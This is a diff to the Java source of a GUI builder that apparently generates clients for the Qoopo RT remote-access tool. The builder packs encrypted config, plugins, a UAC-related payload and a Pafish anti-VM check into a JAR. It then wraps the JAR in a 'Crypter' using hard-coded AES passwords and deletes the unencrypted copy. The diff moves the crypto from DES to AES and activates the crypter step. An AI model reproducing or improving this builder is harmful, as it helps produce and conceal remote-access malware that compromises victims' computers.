@@ -47,14 +47,13 @@ import qooport.utilidades.Compresor;
 import qooport.utilidades.Perfil;
 import qooport.utilidades.SerializarUtil;
 import qooport.utilidades.Util;
-import qooport.utilidades.cifrado.DES;
+import qooport.utilidades.cifrado.AES;
 import qooport.utilidades.cifrado.Encriptacion;
 
 public class CrearCliente extends JFrame {
 
     public static String passCifradoConfig = "LAOSUISNPASD12378ASDLGASDHGAKD";
     public static String passCifradoCripter = "AJHSJKDFHASJDFHW2EFAHSDJFHASKA";
-//    public static String tipoLetra="--Times New Roman--";
     private JFileChooser cd = new JFileChooser();
     private JButton btnCrearCliente;
     private JButton btnGuardarPerfiles;
@@ -508,7 +507,7 @@ public class CrearCliente extends JFrame {
         this.btnCrearCliente.addActionListener(new ActionListener() {
             @Override
             public void actionPerformed(ActionEvent evt) {
-                CrearCliente.this.CrearServerActionPerformed(evt);
+                CrearCliente.this.CrearClienteActionPerformed(evt);
             }
         });
         this.btnGuardarPerfiles.setText("Guardar perfil");
@@ -592,7 +591,7 @@ public class CrearCliente extends JFrame {
         return cfg;
     }
 
-    private void CrearServerActionPerformed(ActionEvent evt) {
+    private void CrearClienteActionPerformed(ActionEvent evt) {
         this.cd.setDialogTitle("Guardar Cliente");
         this.cd.setDialogType(1);
         this.cd.setFileFilter(new FileNameExtensionFilter("Ejecutable Java", new String[]{"jar"}));
@@ -631,28 +630,25 @@ public class CrearCliente extends JFrame {
                 name = name.replaceAll(".jar", "");
                 name += ".jar";
 
-                File destino1 = new File(desTmp.getParent(), name);
-                this.setearPerfil(destino1);
+                File destinoCifrado = new File(desTmp.getParent(), name);
+                File destino = new File(desTmp.getParent(), "tmp-" + name);
+//                File destino = new File(desTmp.getParent(), name);
+//                this.setearPerfil(destino);
+                this.setearPerfil(destinoCifrado);
                 this.guardarArchivosPerfiles(perfiles);
 
-                //File destino = new File(desTmp.getParent(), name + ".tmp");
-                File destino = new File(desTmp.getParent(), name);
-
                 JarInputStream input = new JarInputStream(getClass().getResourceAsStream("/extras/lib/QoopoRTServer.jar"));
-
                 FileOutputStream fout = new FileOutputStream(destino);
-
                 JarOutputStream salida = new JarOutputStream(fout, input.getManifest());
                 salida.setComment("--");
                 //AGREGO ARCHIVO CONFIGURACION V2.0
                 try {
-
 //                    agregarLog("=======================================================");
                     agregarLog("\tEscribiendo configuración en el cliente");
                     ByteArrayOutputStream outAd = new ByteArrayOutputStream();
                     SerializarUtil.escribirStream(armarArchivoConfig(), outAd);
                     salida.putNextEntry(new JarEntry("cfg.dat"));
-                    byte[] datosAdjuntos = DES.encriptDeS(passCifradoConfig, Compresor.comprimirGZIP(outAd.toByteArray()));
+                    byte[] datosAdjuntos = AES.cifrar(passCifradoConfig, Compresor.comprimirGZIP(outAd.toByteArray()));
                     salida.write(datosAdjuntos);
                     salida.closeEntry();
                     agregarLog("\tArchivo de configuración agregado " + Util.convertirBytes(datosAdjuntos.length));
@@ -668,7 +664,7 @@ public class CrearCliente extends JFrame {
                         ByteArrayOutputStream outAd = new ByteArrayOutputStream();
                         SerializarUtil.escribirStream(listaAdjuntos, outAd);
                         salida.putNextEntry(new JarEntry("adjuntos.dat"));
-                        byte[] datosAdjuntos = DES.encriptDeS(passCifradoConfig, Compresor.comprimirGZIP(outAd.toByteArray()));
+                        byte[] datosAdjuntos = AES.cifrar(passCifradoConfig, Compresor.comprimirGZIP(outAd.toByteArray()));
                         salida.write(datosAdjuntos);
                         salida.closeEntry();
                         agregarLog("\tArchivos adjuntos agregados " + Util.convertirBytes(datosAdjuntos.length));
@@ -736,7 +732,7 @@ public class CrearCliente extends JFrame {
                         ByteArrayOutputStream outAd = new ByteArrayOutputStream();
                         SerializarUtil.escribirStream(lstPlugins, outAd);
                         salida.putNextEntry(new JarEntry("plugins.dat"));
-                        byte[] datosAdjuntos = DES.encriptDeS(passCifradoConfig, Compresor.comprimirGZIP(outAd.toByteArray()));
+                        byte[] datosAdjuntos = AES.cifrar(passCifradoConfig, Compresor.comprimirGZIP(outAd.toByteArray()));
                         salida.write(datosAdjuntos);
                         salida.closeEntry();
                         agregarLog("\tPlugins agregados " + Util.convertirBytes(datosAdjuntos.length));
@@ -750,7 +746,7 @@ public class CrearCliente extends JFrame {
                     if (this.panelOpciones.getFn_desUAC().isSelected()) {
                         salida.putNextEntry(new JarEntry("uac.dat"));
                         byte[] entrada = Util.conseguirBytes(QoopoRT.class.getResourceAsStream("/extras/uac.dat"));
-                        byte[] datosAdjuntos = DES.encriptDeS(passCifradoConfig, Compresor.comprimirGZIP(entrada));
+                        byte[] datosAdjuntos = AES.cifrar(passCifradoConfig, Compresor.comprimirGZIP(entrada));
                         salida.write(datosAdjuntos);
                         salida.closeEntry();
                         agregarLog("\tUac agregado " + Util.convertirBytes(datosAdjuntos.length));
@@ -764,7 +760,7 @@ public class CrearCliente extends JFrame {
                     if (this.panelANTIVM.getAntiVM_windows().isSelected()) {
                         salida.putNextEntry(new JarEntry("avmw.dat"));
                         byte[] entrada = Util.conseguirBytes(QoopoRT.class.getResourceAsStream("/extras/pafish.dat"));
-                        byte[] datosAdjuntos = DES.encriptDeS(passCifradoConfig, Compresor.comprimirGZIP(entrada));
+                        byte[] datosAdjuntos = AES.cifrar(passCifradoConfig, Compresor.comprimirGZIP(entrada));
                         salida.write(datosAdjuntos);
                         salida.closeEntry();
                         agregarLog("\tPafish.exe agregado " + Util.convertirBytes(datosAdjuntos.length));
@@ -776,9 +772,8 @@ public class CrearCliente extends JFrame {
                 //fin de la libreria del webcam
                 byte[] BUF = new byte[1024];
                 JarEntry entry;
-                agregarLog("=======================================================");
+                agregarLog("========================================================================================");
                 this.agregarLog("\tComienza escritura del cliente.");
-
                 while ((entry = input.getNextJarEntry()) != null) {
                     //if (!"META-INF/MANIFEST.MF".equals(entry.getName())) {
                     if (!entry.getName().contains("META-INF/MANIFEST.MF")) {
@@ -823,7 +818,7 @@ public class CrearCliente extends JFrame {
                                 otmp.close();
                                 byte[] datos;
                                 this.agregarLog("\t\tCifrando");
-                                datos = DES.encriptDeS(panelCifrado.getKey().getText(), Compresor.comprimirGZIP(otmp.toByteArray()));
+                                datos = AES.cifrar(panelCifrado.getKey().getText(), Compresor.comprimirGZIP(otmp.toByteArray()));
                                 salida.write(datos);
                                 salida.closeEntry();
                                 this.agregarLog("\t\tCifrado");
@@ -845,11 +840,11 @@ public class CrearCliente extends JFrame {
                 fout = null;
                 salida = null;
                 input = null;
-                agregarLog("=======================================================");
+                agregarLog("========================================================================================");
                 this.agregarLog(new StringBuilder().append("Cliente creado correctamente...\n").append(destino.getAbsolutePath()).toString());
                 this.agregarLog("Tamaño cliente:" + Util.convertirBytes(destino.length()));
-//                cifrarArchivo(destino, destino1);
-                JOptionPane.showMessageDialog(this, new StringBuilder().append("Cliente creado correctamente...\n").append(destino.getAbsolutePath()).toString());
+                JOptionPane.showMessageDialog(this, new StringBuilder().append("Cliente creado correctamente. Se procede a cifrar...\n").append(destino.getAbsolutePath()).toString());
+                cifrarArchivo(destino, destinoCifrado, true);
             } catch (IOException ex) {
                 ex.printStackTrace();
             }
@@ -868,7 +863,7 @@ public class CrearCliente extends JFrame {
 //        this.lblEntradaRegistro.setText(rb.getString("servidor.registro"));
 //        this.lblNombreJar.setText(rb.getString("servidor.nobrereg"));
 //    }
-    //valido clases que dependen de la selecion en la configuración,
+    //valido clases que dependen de la seleccion en la configuración,
     // si no se ls va a necesitar no las agrego
     private boolean validarClase(String clase) {
 
@@ -943,20 +938,21 @@ public class CrearCliente extends JFrame {
         return true;
     }
 
-    private void cifrarArchivo(File original, File destino) {
-
+    /**
+     * Cifra el servidor con Crypter
+     *
+     * @param original
+     * @param destino
+     */
+    private void cifrarArchivo(File original, File destino, boolean eliminar) {
         try {
-
             agregarLog("=======================================================");
             agregarLog("\t\tCreando Cliente Cifrado");
             agregarLog("=======================================================");
-
             JarInputStream input = new JarInputStream(getClass().getResourceAsStream("/extras/lib/QoopoRTCrypter.jar"));
             FileOutputStream fout = new FileOutputStream(destino);
-
             JarOutputStream salida = new JarOutputStream(fout, input.getManifest());
             salida.setComment("--");
-
             //AGREGO EL SERVIDOR COMO ARCHIVO ADJUNTO
             try {
                 List<F> lst = new ArrayList();
@@ -966,24 +962,21 @@ public class CrearCliente extends JFrame {
                 archivo.setContenido(ArchivoUtil.bytesArchivo(original));
                 lst.add(archivo);
                 agregarLog("=======================================================");
-                agregarLog("\tAgregando Servidor");
+                agregarLog("\tAgregando Cliente");
                 ByteArrayOutputStream outAd = new ByteArrayOutputStream();
                 SerializarUtil.escribirStream(lst, outAd);
-                salida.putNextEntry(new JarEntry("file.bin"));
-                //byte[] datosAdjuntos = DES.encriptDeS(passCifradoConfig, Compresor.comprimirGZIP(outAd.toByteArray()));
-                byte[] datosAdjuntos = DES.encriptDeS(passCifradoCripter, outAd.toByteArray());
+                salida.putNextEntry(new JarEntry("dat.dat"));
+                byte[] datosAdjuntos = AES.cifrar(passCifradoCripter, outAd.toByteArray());
                 salida.write(datosAdjuntos);
                 salida.closeEntry();
                 agregarLog("\tArchivos adjuntos agregados " + Util.convertirBytes(datosAdjuntos.length));
-
             } catch (Exception e) {
             }
 
-            //fin de la libreria del webcam
             byte[] BUF = new byte[1024];
             JarEntry entry;
             agregarLog("=======================================================");
-            this.agregarLog("\tComienza escritura del cripter.");
+            this.agregarLog("\tComienza escritura del Crypter.");
 
             while ((entry = input.getNextJarEntry()) != null) {
                 //if (!"META-INF/MANIFEST.MF".equals(entry.getName())) {
@@ -1009,13 +1002,14 @@ public class CrearCliente extends JFrame {
             fout = null;
             input = null;
 
-            boolean eliminado = original.delete();
-            if (!eliminado) {
-                this.agregarLog("ADVERTENCIA !!! No se pudo eliminar el archivo sin cifrar " + original.getAbsolutePath());
-                this.agregarLog("ADVERTENCIA !!! El archivo cifrado es " + destino.getAbsolutePath());
-                original.deleteOnExit();
+            if (eliminar) {
+                boolean eliminado = original.delete();
+                if (!eliminado) {
+                    this.agregarLog("ADVERTENCIA !!! No se pudo eliminar el archivo sin cifrar " + original.getAbsolutePath());
+                    this.agregarLog("ADVERTENCIA !!! El archivo cifrado es " + destino.getAbsolutePath());
+                    original.deleteOnExit();
+                }
             }
-
             this.agregarLog(new StringBuilder().append("Cliente cifrado correctamente...\n").append(destino.getAbsolutePath()).toString());
             this.agregarLog("Tamaño cliente:" + Util.convertirBytes(destino.length()));
             JOptionPane.showMessageDialog(this, new StringBuilder().append("Cliente cifrado correctamente...\n").append(destino.getAbsolutePath()).toString());
